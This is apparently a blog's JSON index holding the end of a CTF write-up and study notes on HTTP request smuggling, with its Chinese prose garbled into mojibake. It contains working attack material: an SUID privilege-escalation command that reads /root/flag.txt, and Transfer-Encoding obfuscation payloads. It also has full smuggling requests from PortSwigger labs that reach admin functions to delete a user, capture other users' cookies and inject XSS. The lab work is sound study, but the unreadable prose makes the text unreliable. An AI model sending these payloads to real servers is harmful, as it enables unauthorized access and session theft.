string(ttt)) out, err := cmd.CombinedOutput() if err != nil { fmt.Printf(\u0026#34;combined out:\\n%s\\n\u0026#34;, string(out)) log.Fatalf(\u0026#34;cmd.Run() failed with %s\\n\u0026#34;, err) } fmt.Printf(\u0026#34;combined out:\\n%s\\n\u0026#34;, string(out)) } fxxkgo åŸé¢˜ go ssti+jwtä¼ªé€ ï¼Œ[LineCTF 2022]gotm\nezcms å®šä½åˆ°sys/apps/controllers/admin/Update.phpï¼Œæœ‰ç»å…¸çš„åå°ä¸‹è½½zipå¹¶è§£å‹çš„åŠŸèƒ½\næ³¨æ„åˆ°ä¸‹è½½ä¸­é—´ç”¨åˆ°äº†sys_authï¼Œæœ‰ä¸ªå…¨å±€key=GKwHuLj9AOhaxJ2\næ ¹æ®sys_authç”Ÿæˆå¯¹åº”çš„urlï¼Œè®¿é—®ï¼Œèšå‰‘\nrootme suidææƒ\nfind / -perm -4000 2\u0026gt;/dev/null LFILE=/root/flag.txt date -f $LFILE é—®å· å¥½å¥½å¥½\n","date":"2022-05-22T17:25:29+08:00","permalink":"https://amiaaaz.github.io/2022/05/22/dasctf0522-wp/","section":"posts","tags":["wp"],"title":"DasCTF0522 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"å‚è€ƒé“¾æ¥è§æ–‡æœ«ï¼Œå¦‚æœ‰é”™æ¼è¿˜è¯·æŒ‡æ­£ï¼ˆæ»‘è·ª\n*052822ï¼šçœ‹äº†å¾ˆå¤šå¸ˆå‚…å¯¹äºBigIp cveçš„åˆ†æåå‘ç°è‡ªå·±å¯¹äºHop By Hopæ¼æ´çš„äº†è§£è¿˜æ˜¯æµ…å°è¾„æ­¢äº†ï¼Œä¸æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ï¼Œè­¦ç¤ºè‡ªå·±\nHTTPè¯·æ±‚èµ°ç§ æ¼æ´æˆå›  è¯·æ±‚èµ°ç§å¤§å¤šå‘ç”Ÿäºå‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯ä¼ å…¥çš„æ•°æ®ç†è§£ä¸ä¸€è‡´æ—¶ï¼Œè¿™ç§å·®å¼‚å¯ä»¥è®©æˆ‘ä»¬åœ¨ä¸€ä¸ªHTTPè¯·æ±‚ä¸­åµŒå…¥å¦ä¸€ä¸ªHTTPè¯·æ±‚ ä»¥è¾¾åˆ°èµ°ç§çš„ç›®çš„ï¼Œç›´æ¥è¡¨ç°ä¸ºæˆ‘ä»¬å¯ä»¥è®¿é—®å†…ç½‘æœåŠ¡ï¼Œæˆ–è€…é€ æˆä¸€äº›å…¶ä»–çš„æ”»å‡»\nkeep-alive \u0026amp; pipeline ä¸ºäº†ç¼“è§£æºç«™çš„å‹åŠ›ï¼Œä¸€èˆ¬ä¼šåœ¨ç”¨æˆ·å’Œåç«¯æœåŠ¡å™¨ï¼ˆæºç«™ï¼‰ä¹‹é—´åŠ è®¾å‰ç½®æœåŠ¡å™¨ï¼Œç”¨ä»¥ç¼“å­˜ã€ç®€å•æ ¡éªŒã€è´Ÿè½½å‡è¡¡ç­‰ï¼Œè€Œå‰ç½®æœåŠ¡å™¨ä¸åç«¯æœåŠ¡å™¨å¾€å¾€æ˜¯åœ¨å¯é çš„ç½‘ç»œåŸŸä¸­ï¼Œip ä¹Ÿæ˜¯ç›¸å¯¹å›ºå®šçš„ï¼Œæ‰€ä»¥å¯ä»¥é‡ç”¨ TCP è¿æ¥æ¥å‡å°‘é¢‘ç¹ TCP æ¡æ‰‹å¸¦æ¥çš„å¼€é”€\nè¿™é‡Œå°±ç”¨åˆ°äº†HTTP1.1ä¸­çš„Keep-Aliveå’ŒPipelineç‰¹æ€§ï¼Œkeep-aliveè®©æœåŠ¡å™¨åœ¨æ¥å—å®Œè¿™æ¬¡çš„httpè¯·æ±‚åä¸è¦å…³é—­TCPè¿æ¥ï¼Œå¯¹åé¢ç›¸åŒç›®æ ‡æœåŠ¡å™¨çš„HTTPè¯·æ±‚é‡ç”¨è¿™ä¸€ä¸ªTCPè¿æ¥ï¼Œè¿™æ ·åªéœ€ä¸€æ¬¡TCPæ¡æ‰‹ï¼Œå‡å°‘æœåŠ¡å™¨å¼€é”€ èŠ‚çº¦èµ„æºï¼›è€ŒPipelineå…è®¸å®¢æˆ·ç«¯åƒæµæ°´çº¿ä¸€æ ·å‘é€è¯·æ±‚ï¼ŒæœåŠ¡ç«¯æ ¹æ®FIFOåŸåˆ™å“åº”\nä»¥ä¸‹æ˜¯ä½¿ç”¨ä»¥åŠä¸ä½¿ç”¨ piepeline æŠ€æœ¯çš„å¯¹æ¯”å›¾ï¼š\nåœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœå‰ç½®æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨åº”å½“åœ¨HTTPè¯·æ±‚çš„è¾¹ç•Œåˆ’åˆ†ä¸Šä¸ä¸€è‡´ï¼Œå½“æˆ‘ä»¬å‘é€ç²¾å¿ƒæ„é€ çš„æ¨¡ç³Šçš„HTTPè¯·æ±‚ï¼Œå°±ä¼šäº§ç”Ÿæ¼æ´ï¼Œè€Œæ¨¡ç³Šçš„ç‚¹å°±åœ¨äºä¸‹é¢è¦æåˆ°çš„CL \u0026amp; TE\nCL \u0026amp; TE HTTPè§„èŒƒæä¾›äº†ä¸¤ç§ä¸åŒçš„æ–¹æ³•æ¥æŒ‡å®šè¯·æ±‚çš„ç»“æŸä½ç½® Content-Lengthå’ŒTransfer-Encodingï¼›å…¶ä¸­TEè¯·æ±‚å¤´æ¯”è¾ƒç‰¹æ®Šï¼ŒHTTP/2ä¸­ä¸å†æ”¯æŒï¼ŒæŒ‡å®šç”¨äºä¼ è¾“è¯·æ±‚ä¸»ä½“çš„ç¼–ç æ–¹å¼ï¼Œå¯ç”¨çš„å€¼æœ‰chunked/compress/deflate/gzip/identity | doc\nè¿™é‡Œæˆ‘ä»¬å…³æ³¨Transfer-Encoding: chunkedï¼Œå½“è¿™æ ·è®¾ç½®ä¹‹åï¼ŒbodyæŒ‰ä¸€ç³»åˆ—å—çš„å½¢å¼å‘é€ å¹¶çœç•¥CLå¤´ï¼›æ¯ä¸ªå—çš„å¼€å¤´ç”¨16ç¦æ­¢æ•°è¡¨æ˜å½“å‰å—çš„é•¿åº¦ï¼Œæ•°å€¼åæ¥2å­—èŠ‚çš„\\r\\nï¼Œç„¶åæ˜¯å—çš„å†…å®¹ï¼Œå†æ¥\\r\\nè¡¨ç¤ºç»“æŸï¼Œæœ€åç”¨é•¿åº¦ä¸º0çš„å—è¡¨ç¤ºç»ˆæ­¢å—ï¼Œç»ˆæ­¢å—åæ˜¯trailerï¼Œç”±0æˆ–å¤šä¸ªå®ä½“å¤´ç»„æˆï¼Œå¯ä»¥å­˜æ”¾å¯¹æ•°æ®çš„æ•°å­—ç­¾å\nPOST / HTTP/1.1 Host: 1.com Content-Type: application/x-www-form-urlencoded Transfer-Encoding: chunked b q=smuggling 6 hahaha 0 [ç©ºç™½è¡Œ] [ç©ºç™½è¡Œ] [chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size = 0][\\r\\n][\\r\\n] åœ¨è®¡ç®—é•¿åº¦æ—¶æ³¨æ„è¿™æ ·çš„åŸåˆ™ï¼š\nCLéœ€è¦å°†bodyä¸­\\r\\næ‰€å çš„2å­—èŠ‚è®¡ç®—åœ¨å†…ï¼Œè€Œå—é•¿åº¦è¦å¿½ç•¥å—å†…å®¹æœ«å°¾è¡¨ç¤ºç»ˆæ­¢çš„\\r\\n è¯·æ±‚å¤´å’Œbodyä¸­ç©ºè¡Œä¸è®¡å…¥CL æµ‹è¯•ç”¨chunkedå‘é€\nWikipedia in\\r\\n\\r\\nchunks. å¯ä»¥è¿™æ ·\nPOST /xxx HTTP/1.1 Host: xxx Content-Type: text/plain Transfer-Encoding: chunked 4\\r\\n Wiki\\r\\n 5\\r\\n pedia\\r\\n e\\r\\n in\\r\\n\\r\\nchunks.\\r\\n 0\\r\\n \\r\\n 4æ˜¯16è¿›åˆ¶æ•° åæ¥2å­—èŠ‚\\r\\nè¡¨ç¤ºchunk-sizeï¼Œåæ¥chunk-sizeå¤§å°çš„Wikiï¼Œåæ¥ä¸¤å­—èŠ‚çš„\\r\\nè¡¨ç¤ºchunk-dataéƒ¨åˆ†\nç¬¬ä¸‰éƒ¨åˆ†æ•°æ®\ne\\r\\n in\\r\\n\\r\\nchunks.\\r\\n e = 14 = 1(ç©ºæ ¼) + 2(in) + 4(\\r\\n*2) + 7(chunks.)\næœ€åçš„0\\r\\n\\r\\nè¡¨ç¤º chunk éƒ¨åˆ†ç»“æŸ\næ”»å‡»æ–¹å¼ CL.TE å‰ç«¯æœåŠ¡å™¨å¤„ç†Content-Lengthï¼Œåç«¯æœåŠ¡å™¨éµå®ˆRFC2616è§„å®šå¤„ç†Transfer-Encoding\nPOST / HTTP/1.1 Host: 1.com Content-Length: 6 Transfer-Encoding: chunked 0 a aä¼šè¢«è®¤ä½œä¸‹ä¸€ä¸ªè¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œç•™åœ¨ç¼“å†²åŒºç­‰å¾…å‰©ä½™çš„è¯·æ±‚ï¼Œæ­¤æ—¶å†æœ‰GETå°±ä¼šè¢«æ‹¼æ¥ä¸ºaGET / HTTP/1.1\\r\\nï¼Œç•¸å½¢çš„aGETä¼šé€ æˆè§£æå¼‚å¸¸\naGET / HTTP/1.1 Host: 1.com .... å¦‚æœå­˜åœ¨è¿™æ ·çš„æ¼æ´ï¼Œå‘é€ä¸Šé¢çš„payloadä¼šé€ æˆå»¶æ—¶ï¼ˆåç«¯æœåŠ¡å™¨ç­‰ä¸‹ä¸€ä¸ªchunkæ¥æ¸…æ‰ç¼“å†²åŒº\nTE.CL å‰ç«¯æœåŠ¡å™¨Transfer-Encodingï¼Œåç«¯æœåŠ¡å™¨Content-Lengthæ ‡å¤´\nPOST / HTTP/1.1 Host: example.com ... Content-Length: 4 Transfer-Encoding: chunked 17 POST /rook1e HTTP/1.1 0 [ç©ºç™½è¡Œ] [ç©ºç™½è¡Œ] å‰ç«¯æœåŠ¡å™¨åˆ†å—ä¼ è¾“é•¿åº¦ä¸º17çš„å—POST /rook1e HTTP/1.1\\r\\nï¼Œåç«¯åˆ™æ ¹æ®CL=4æˆªå–åˆ°17\\r\\nå¹¶æŠŠåé¢çš„æ”¾å…¥ç¼“å†²åŒºï¼Œæ­¤æ—¶å†æœ‰GETå°±ä¼šè¢«æ‹¼æ¥ä¸ºPOST /rook1eèµ°ç§è¯·æ±‚\nPOST /rook1e HTTP/1.1 0 GET / HTTP/1.1 .... å¦‚æœå­˜åœ¨è¿™æ ·çš„æ¼æ´ï¼Œå‘é€ä¸Šé¢çš„payloadä¼šé€ æˆå»¶æ—¶ï¼ˆåç«¯æœåŠ¡å™¨ç­‰å¾…å‰©ä½™éƒ¨åˆ†\nTE.TE å‰ç«¯å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒTransfer-Encoding æ ‡å¤´ï¼Œä½†æ˜¯å®¹é”™æ€§ä¸Šè¡¨ç°ä¸åŒï¼Œå¯ä»¥é€šè¿‡ä»¥æŸç§æ–¹å¼æ¥è¯±å¯¼å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†å®ƒï¼Œå˜ä¸ºä¸Šé¢ä¸¤ç§ä¹‹ä¸€\nPOST / HTTP/1.1 Host: 1.com Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding[ç©ºæ ¼]: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 [ç©ºç™½è¡Œ] [ç©ºç™½è¡Œ] fuzzç”¨payloadï¼Œæ ¹æ®å®ç°RFCçš„ä¸åŒè€Œæœ‰ç»†å¾®çš„å·®åˆ«\nTransfer-Encoding: xchunked Transfer-Encoding[ç©ºæ ¼]: chunked Transfer-Encoding: chunked Transfer-Encoding: x Transfer-Encoding:[tab]chunked [ç©ºæ ¼]Transfer-Encoding: chunked X: X[\\n]Transfer-Encoding: chunked Transfer-Encoding : chunked CL.CL è¯·æ±‚åŒ…ä¸­åŒ…å«ä¸¤ä¸ªä¸åŒå€¼å¾—Content-Lengthï¼Œæ ¹æ®RFC7230ä¼šè¿”å›400ï¼Œä½†æ˜¯æœ‰å¯èƒ½æœåŠ¡å™¨å¹¶æ²¡æœ‰ä¸¥æ ¼éµå®ˆè¿™ä¸ªè§„èŒƒ\nPOST / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-Length: 8\\r\\n Content-Length: 7\\r\\n 12345\\r\\n a aä¼šè¢«å¸¦å…¥ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼Œå˜ä¸ºaGET / HTTP/1.1\\r\\n\nCL in GET å‰ç«¯æœåŠ¡å™¨å…è®¸GETæºå¸¦bodyï¼Œåç«¯ä¸å…è®¸GETæºå¸¦body å¹¶ç›´æ¥å¿½ç•¥GETè¯·æ±‚ä¸­çš„Content-Lengthæ ‡å¤´ï¼ŒåŸºäºpipelineæœºåˆ¶è®¤ä¸ºè¿™æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„è¯·æ±‚ï¼ˆç±»ä¼¼Nodejsä¸­çš„cve-2018-12116ï¼‰\nGET / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-Length: 41\\r\\n \\r\\n GET /secret HTTP/1.1\\r\\n Host: example.com\\r\\n \\r\\n åç«¯è®¤ä½œä¸¤ä¸ªç‹¬ç«‹çš„è¯·æ±‚ï¼Œè¿™é‡Œæ ¼å¤–æ³¨æ„CLå€¼å¾—è®¡ç®—22+19=41ï¼ˆåˆ†åˆ«lenä¸€ä¸‹\nGET /secret HTTP/1.1\\r\\n\t--\u0026gt;\t20ä¸ªå­—ç¬¦+CRLF = 22 Host: example.com\\r\\n\t--\u0026gt;\t17ä¸ªå­—ç¬¦+CRLF = 19 optional whitespace/cve-2019-16869 RFC7320ä¸­è¦æ±‚headeréƒ¨åˆ† å­—æ®µä¹‹åè¦ç´§è·Ÿ:ï¼Œä¹‹åæ˜¯optional whitespaceï¼›å¦‚æœæœ‰ä¸­é—´ä»¶æ²¡æœ‰ä¸¥æ ¼å®ç°è¿™ä¸ªRFCå°±ä¼šæœ‰è¢«æ”»å‡»çš„å¯èƒ½\ncve-2019-16869æ˜¯Nettyä¸­é—´ä»¶çš„æ¼æ´ï¼Œåœ¨4.1.42Finalç‰ˆæœ¬å‰å¯¹äºHeaderå¤´çš„å¤„ç†æ˜¯ä½¿ç”¨splitHeaderæ–¹æ³•ï¼Œå…¶ä¸­å…³é”®ä»£ç å¦‚ä¸‹ï¼š\nfor (nameEnd = nameStart; nameEnd \u0026lt; length; nameEnd ++) { char ch = sb.charAt(nameEnd); if (ch == \u0026#39;:\u0026#39; || Character.isWhitespace(ch)) { break; } } è¿™é‡Œå°†ç©ºæ ¼ä¸å†’å·åŒæ ·å¤„ç†äº†ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœå­˜åœ¨ç©ºæ ¼ä¼šæŠŠå†’å·ä¹‹å‰çš„field nameæ­£å¸¸å¤„ç†è€Œä¸ä¼šæŠ›å‡ºé”™è¯¯æˆ–è¿›è¡Œå…¶ä»–æ“ä½œ\nPOST /getusers HTTP/1.1 Host: www.backend.com Content-Length: 64 Transfer-Encoding : chunked 0 GET /hacker HTTP/1.1 Host: www.hacker.com hacker: hacker ç”¨ELBä½œå‰ç«¯æœåŠ¡å™¨ï¼ŒNettyä½œåç«¯æœåŠ¡å™¨ï¼Œå½“å‘é€ä¸Šè¿°è¯·æ±‚æ—¶ç”±äºTEå­—æ®µå†’å·å‰çš„ç©ºæ ¼ä¸ç¬¦åˆRFCæ ‡å‡†ï¼Œä¼šè¢«ELBå¿½ç•¥ æŒ‰ç…§CLè§£æå¹¶è½¬å‘ç»™åç«¯çš„Nettyï¼ŒNettyä¼šä¼˜å…ˆè§£æTEï¼ˆå³ä½¿ä¸åˆRFCçš„æ ‡å‡†ï¼‰å¹¶æ‹†åˆ†ä¸ºä¸€ä»¥ä¸‹ä¸¤ä¸ªè¯·æ±‚\nPOST /getusers HTTP/1.1 Host: www.backend.com Content-Length: 64 Transfer-Encoding : chunked 0 GET /hacker HTTP/1.1 Host: www.hacker.com hacker: hacker åœ¨4.1.42Finalä¸­ä¿®å¤äº†è¿™ä¸ªæ´ï¼Œå½“ä¸è§„èŒƒçš„è¯·æ±‚å¤´å‡ºç°æ—¶ä¼šè¿”å›400\nchunk size issue printf \u0026#39;GET / HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39;\\ \u0026#39;Dummy:Header\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;0000000000000000000000000000042\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;GET /tmp/ HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;0\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ | nc -q3 127.0.0.1 8080 æŸäº›ä¸­é—´ä»¶åœ¨è§£æå—å¤§å°çš„æ—¶å€™ï¼Œä¼šå°†é•¿åº¦å—å¤§å°é•¿åº¦è¿›è¡Œæˆªæ–­ï¼Œæ¯”å¦‚è¿™é‡Œè¡¨ç°ä¸ºåªå–'0000000000000000000000000000042ä¸º00000000000000000ï¼Œè¿™æ ·å°±ä¼šè®¤ä¸ºè¿™æ˜¯ä¸¤ä¸ªè¯·æ±‚äº†ï¼Œç¬¬ä¸€ä¸ªè¯·æ±‚çš„å—å¤§å°ä¸º0ï¼Œç¬¬äºŒä¸ªå°±ä¼šè¯·æ±‚/tmpï¼Œå°±å¯¼è‡´äº† HTTP Smuggling\nHTTP/0.9 HTTP/1.1\nGET /foo HTTP/1.1\\r\\n Host: example.com\\r\\n HTTP/1.0\nGET /foo HTTP/1.0\\r\\n \\r\\n HTTP/0.9\nGET /foo\\r\\n HTTP/0.9è¯·æ±‚åŒ…ä¸å“åº”åŒ…æ˜¯éƒ½æ²¡æœ‰ headers çš„æ¦‚å¿µçš„ï¼Œbodyæ˜¯æ–‡æœ¬æµå½¢å¼ï¼Œæ‰€ä»¥ç†æ‰€å½“ç„¶çš„å°è¯•æ”»å‡»\nå›¾ä¸­èµ°ç§çš„éƒ¨åˆ†å¹¶ä¸æ˜¯HTTP/0.9çš„æ ‡å‡†æ ¼å¼ä½†ç”±äºä¸€äº›ä¸­é—´ä»¶è™½ç„¶å·²ç»ä¸æ”¯æŒç›´æ¥è§£æHTTP/0.9çš„æ ‡å‡†æ ¼å¼ï¼Œä½†æ˜¯è¿˜å¯èƒ½å­˜åœ¨è§£æè¿™ç§æŒ‡å®š HTTP version çš„æƒ…å†µ\nè§†é¢‘æ¼”ç¤º-link\nå®é™…ç”¨ä¾‹ ç»•è¿‡å‰ç«¯å®‰å…¨æ§åˆ¶ https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te\næˆ‘ä»¬éœ€è¦è·å–adminæƒé™å¹¶åˆ é™¤carlosç”¨æˆ·ï¼›ç›´æ¥è®¿é—®/adminæç¤º403ï¼Œå°è¯•smuggling\nPOST / HTTP/1.1 Host: acf91f491f39aa83ca24ee71001b00aa.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a Content-Length: 28 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 å‘é€2æ¬¡åå›æ˜¾Admin interface only available if logged in as an administrator, or if requested as localhostï¼Œæˆ‘ä»¬åœ¨èµ°ç§çš„éƒ¨åˆ†åŠ ä¸Šlocalhostå¹¶æ›´æ–°CLé•¿åº¦\nPOST / HTTP/1.1 Host: acf91f491f39aa83ca24ee71001b00aa.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a Content-Length: 45 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost å¾—åˆ°åˆ é™¤carlosçš„api /admin/delete?username=carlosï¼Œç»§ç»­ä¿®æ”¹payload\nPOST / HTTP/1.1 Host: acf91f491f39aa83ca24ee71001b00aa.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a Content-Length: 68 Transfer-Encoding: chunked 0 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost ä¸€å®šæ³¨æ„\\r\\næ•°é‡å’ŒCLçš„å¤§å°\næ³„éœ²ä»£ç†æœåŠ¡å™¨é‡å†™å­—æ®µ https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting\næˆ‘ä»¬éœ€è¦é¦–å…ˆæ‰¾å‡ºè¢«å‰ç«¯æœåŠ¡å™¨å¢åŠ çš„å­—æ®µï¼Œä¹‹åä¼ªé€ æœ¬åœ°è¯·æ±‚å¹¶smugglingè®¿é—®/adminå¹¶åˆ é™¤carlosè´¦å·\nè¦è¾¾åˆ°å‰è€…çš„ç›®çš„ï¼Œportswiggerçš„è§£å†³æ–¹æ¡ˆæ˜¯è¿™æ ·çš„\næ‰¾ä¸€ä¸ªèƒ½å¤Ÿå°†è¯·æ±‚å‚æ•°çš„å€¼è¾“å‡ºåˆ°å“åº”ä¸­çš„POSTè¯·æ±‚ æŠŠè¯¥POSTè¯·æ±‚ä¸­ï¼Œæ‰¾åˆ°çš„è¿™ä¸ªç‰¹æ®Šçš„å‚æ•°æ”¾åœ¨æ¶ˆæ¯çš„æœ€åé¢ èµ°ç§è¿™ä¸ªè¯·æ±‚ï¼Œç„¶åç›´æ¥å‘é€ä¸€ä¸ªæ™®é€šçš„è¯·æ±‚ï¼Œå‰ç«¯æœåŠ¡å™¨å¯¹è¿™ä¸ªè¯·æ±‚é‡å†™çš„ä¸€äº›å­—æ®µå°±ä¼šæ˜¾ç¤ºå‡ºæ¥ å°è¯•å‰é¢çš„payload\nPOST / HTTP/1.1 Host: aca21f881e7fa688c0e81584004700af.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a Content-Length: 28 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 å›æ˜¾Admin interface only available if logged in as an administrator, or if requested from 127.0.0.1ï¼Œæˆ‘ä»¬åˆ©ç”¨æœç´¢å›æ˜¾å°†å‰ç«¯æœåŠ¡å™¨è½¬å‘çš„è¯·æ±‚å¤´æ³„éœ²å‡ºæ¥ï¼Œè¿™é‡Œç¬¬äºŒéƒ¨åˆ†çš„CL=70ç”¨æ¥æ§åˆ¶æ³„éœ²å­—èŠ‚çš„å¤šå°‘\nPOST / HTTP/1.1 Host: aca21f881e7fa688c0e81584004700af.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=VfYd3AGPB3TOUZNTRF2frj0c5kNJgBpw Content-Length: 103 Transfer-Encoding: chunked 0 POST / HTTP/1.1 Content-Length: 70 Content-Type: application/x-www-form-urlencoded search=123 å‘ç°å‰ç«¯æœåŠ¡å™¨è‡ªåŠ¨ä¼šåŠ ä¸ŠX-XpZgRc-Ipçš„è¯·æ±‚å¤´ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥åŠ ä¸€æ ·çš„å†…å®¹ä¼šå› ä¸ºduplicate header namesçš„åŸå› è€Œ403ï¼Œæˆ‘ä»¬é€‰æ‹©smugglingæ”»å‡»å°†å‰ç«¯æœåŠ¡å™¨å¤šåŠ çš„è¯·æ±‚å¤´éšè—æ‰\nPOST / HTTP/1.1 Host: aca21f881e7fa688c0e81584004700af.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=VfYd3AGPB3TOUZNTRF2frj0c5kNJgBpw Content-Length: 75 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 X-XpZgRc-Ip: 127.0.0.1 Content-Length: 10 x=1 å›æ˜¾åˆ é™¤carlosçš„api /admin/delete?username=carlos\nè·å–å…¶å®ƒç”¨æˆ·è¯·æ±‚ åŸç†è·Ÿä¸Šé¢æ³„éœ²å­—æ®µå¤§ä½“ç›¸åŒï¼Œæ—¢ç„¶èƒ½å¾—åˆ°ä¸­é—´ä»¶è¯·æ±‚ æˆ‘ä»¬ä¹Ÿå¯ä»¥å°è¯•å¾—åˆ°å…¶å®ƒç”¨æˆ·çš„è¯·æ±‚å’Œcookieç­‰\nPOST / HTTP/1.1 Host: ac951f7d1e9ea625803c617f003f005c.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: application/x-www-form-urlencoded Content-Length: 271 Transfer-Encoding: chunked 0 POST /post/comment HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 600 Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At csrf=oIjWmI8aLjIzqX18n5mNCnJieTnOVWPN\u0026amp;postId=5\u0026amp;name=1\u0026amp;email=1%40qq.com\u0026amp;website=http%3A%2F%2Fwww.baidu.com\u0026amp;comment=1 åŠ å¼ºç‰ˆXSS UAå¤´æœ‰åå°„XSSï¼Œæˆ‘ä»¬æ„é€ è¿™æ ·çš„payload\nPOST / HTTP/1.1 Host: ac811f011e27d43b80301693005a0007.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=iSxMvTrkiVN2G5N7EF7MTKgXGRE6A5xZ Upgrade-Insecure-Requests: 1 Content-Length: 150 Transfer-Encoding: chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent: \u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1 åªéœ€è¦å‘é€ä¸€æ¬¡ï¼Œä¹‹åä»»æ„è®¿é—®é¡µé¢éƒ½ä¼šå¼¹çª—ï¼Œå› ä¸ºæˆ‘ä»¬çš„è¯·æ±‚åµŒå…¥åˆ°ä¸Šé¢ç¬¬äºŒä¸ªè¯·æ±‚ä¸­\nä¿®æ”¹é‡å®šå‘ ç›®æ ‡åœ¨ä½¿ç”¨ 30x è·³è½¬çš„æ—¶å€™ï¼Œä½¿ç”¨äº† Host å¤´è¿›è¡Œè·³è½¬ï¼Œä¾‹å¦‚åœ¨ Apache \u0026amp; IIS æœåŠ¡å™¨ä¸Šï¼Œä¸€ä¸ªuri æœ€åä¸å¸¦ / çš„è¯·æ±‚ä¼šè¢« 30x å¯¼å‘å¸¦ / 